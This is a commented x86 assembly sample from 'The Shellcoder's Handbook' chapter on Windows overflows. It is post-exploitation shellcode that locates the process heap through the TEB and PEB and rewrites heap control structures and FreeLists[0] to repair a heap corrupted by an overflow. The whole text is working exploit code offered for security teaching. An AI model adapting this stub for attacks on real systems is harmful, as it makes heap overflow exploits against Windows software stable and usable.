/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 8: Windows Overflows
Sample Program #10

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/

// We've just landed in our buffer after a
     // call to dword ptr[edi+74]. This, therefore
     // is a pointer to the heap control structure
     // so move this into edx as we'll need to 
     // set some values here
     mov edx, dword ptr[edi+74]
     // If running on Windows 2000 use this
     // instead
     // mov edx, dword ptr[esi+0x4C]
     // Push 0x18 onto the stack
     push 0x18
     // and pop into into EBX
     pop ebx
     // Get a pointer to the Thread Information
     // Block at fs:[18]
     mov eax, dword ptr fs:[ebx]
     // Get a pointer to the Process Environment
     // Block from the TEB.
     mov eax, dword ptr[eax+0x30]
     // Get a pointer to the default process heap
     // from the PEB
     mov eax, dword ptr[eax+0x18]
     // We now have in eax a pointer to the heap
     // This address will be of the form 0x00nn0000
     // Adjust the pointer to the heap to point to the
     // TotalFreeSize dword of the heap structure
     add al,0x28
     // move the WORD in TotalFreeSize into si
     mov si, word ptr[eax]
     // and then write this to our heap control
     // structure. We need this.
     mov word ptr[edx],si
     // Adjust edx by 2
     inc edx
     inc edx
     // Set the previous size to 8
     mov byte ptr[edx],0x08
     inc edx
     // Set the next 2 bytes to 0
     mov si, word ptr[edx]
     xor word ptr[edx],si
     inc edx
     inc edx
     // Set the flags to 0x14
     mov byte ptr[edx],0x14
     inc edx
     // and the next 2 bytes to 0
     mov si, word ptr[edx]
     xor word ptr[edx],si
     inc edx
     inc edx
     // now adjust eax to point to heap_base+0x178
     // It's already heap_base+0x28
     add ax,0x150
     // eax now points to FreeLists[0]
     // now write edx into FreeLists[0].Flink
     mov dword ptr[eax],edx
     // and write edx into FreeLists[0].Blink
     mov dword ptr[eax+4],edx
     // Finally set the pointers at the end of our
     // block to point to FreeLists[0]
     mov dword ptr[edx],eax
     mov dword ptr[edx+4],eax
